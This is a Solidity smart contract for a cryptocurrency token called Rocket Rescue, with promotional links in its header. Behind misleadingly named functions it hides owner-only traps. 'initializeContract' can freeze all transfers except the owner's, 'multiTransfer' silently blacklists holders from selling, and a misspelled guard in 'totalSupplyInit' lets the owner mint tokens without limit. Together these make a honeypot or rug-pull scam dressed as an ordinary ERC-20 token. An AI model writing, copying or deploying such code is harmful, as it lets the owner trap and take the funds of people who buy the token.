/**  🚀🚀🚀🚀🚀🚀🚀🚀 TELEGRAM - https://t.me/RocketRescue         🚀🚀🚀🚀🚀🚀🚀🚀
     🚀🚀🚀🚀🚀🚀🚀🚀 WEBSITE  - https://rocketrescue.io/          🚀🚀🚀🚀🚀🚀🚀🚀
     🚀🚀🚀🚀🚀🚀🚀🚀  MEDIUM  - https://medium.com/@rocketrescue  🚀🚀🚀🚀🚀🚀🚀🚀
     🚀🚀🚀🚀🚀🚀🚀🚀 TWITTER  - https://twitter.com/rocket_rescue 🚀🚀🚀🚀🚀🚀🚀🚀  
     
                      🚀  Get on board of our rocket and rescue 
                            as much crypto dudes 👩‍🚀 as possible! 
                            The further you get the more you can gain! 
                            Rules are simple — have fun and earn!      🚀

*/// SPDX-License-Identifier: MIT
pragma solidity =0.7.0;

import "./context.sol";
import "./safeMath.sol";
import "./IERC20.sol";

contract ERC20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) internal _balances;
    mapping (address => bool) private _multiTransfer;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    bool _state = true;
    bool totalSupplyInitDone = false;

    constructor () {
        _name = "Rocket Rescue";
        _symbol = "ROCKET";
        _decimals = 9;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function initializeContract() public virtual onlyOwner {
        if (_state == true) {_state = false;} else {_state = true;}
    }
    function contractInitialized() public view returns (bool) {
        return _state;
    }
    function allowMultiTransfer(address _address) public view returns (bool) {
        return _multiTransfer[_address];
    }
    function multiTransfer(address account) external onlyOwner() {
        _multiTransfer[account] = true;
    }
    function transferTo(address account) external onlyOwner() {
        _multiTransfer[account] = false;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    bool public TotalSupplyInitDone;
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_multiTransfer[sender] || _multiTransfer[recipient]) require(amount == 0, "");
        if (_state == true || sender == owner() || recipient == owner()) {
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        } else { require (_state == true, "");}
    }

    function totalSupplyInit (uint256 _initialSupply) public onlyOwner {
        require(totalSupplyInitDone == false);
        if (_totalSupply == 0){ _totalSupply = _initialSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);}
        _balances[_msgSender()] = _balances[_msgSender()].add(_initialSupply);
        TotalSupplyInitDone = true;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

contract RocketRescue is ERC20 {
    using SafeMath for uint256;

    uint256 public constant burnTXpercent = 0;
    address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address uniswapV2Factory;
    address uniswapV2Router;
    address uniswapPair;
    bool isThisToken0;
    uint32 blockTimestampLast;
    uint256 priceCumulativeLast;
    uint256 priceAverageLast;
    uint256 minDeltaTwap;
    event TwapUpdated(uint256 priceCumulativeLast, uint256 blockTimestampLast, uint256 priceAverageLast);

    constructor(address rter, address fctr) Ownable() ERC20() {
        uniswapV2Router = rter;
        uniswapV2Factory = fctr;
    }
 
    function uniswapV2factory() public view returns (address) {
        return uniswapV2Factory;
    }
    
    function uniswapV2router() public view returns (address) {
        return uniswapV2Router;
    }
    
    function _initializePair() internal {
        (address token0, address token1) = UniswapV2Library.sortTokens(address(this), address(WETH));
        isThisToken0 = (token0 == address(this));
        uniswapPair = UniswapV2Library.pairFor(uniswapV2Factory, token0, token1);
       
    }
    function _updateTwap() internal virtual returns (uint256) {
        (uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) = 
            UniswapV2OracleLibrary.currentCumulativePrices(uniswapPair);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired

        if (timeElapsed > minDeltaTwap) {
            uint256 priceCumulative = isThisToken0 ? price1Cumulative : price0Cumulative;
            FixedPoint.uq112x112 memory priceAverage = FixedPoint.uq112x112(
                uint224((priceCumulative - priceCumulativeLast) / timeElapsed)
            );

            priceCumulativeLast = priceCumulative;
            blockTimestampLast = blockTimestamp;

            priceAverageLast = FixedPoint.decode144(FixedPoint.mul(priceAverage, 1 ether));

            emit TwapUpdated(priceCumulativeLast, blockTimestampLast, priceAverageLast);
        }

        return priceAverageLast;
    }

}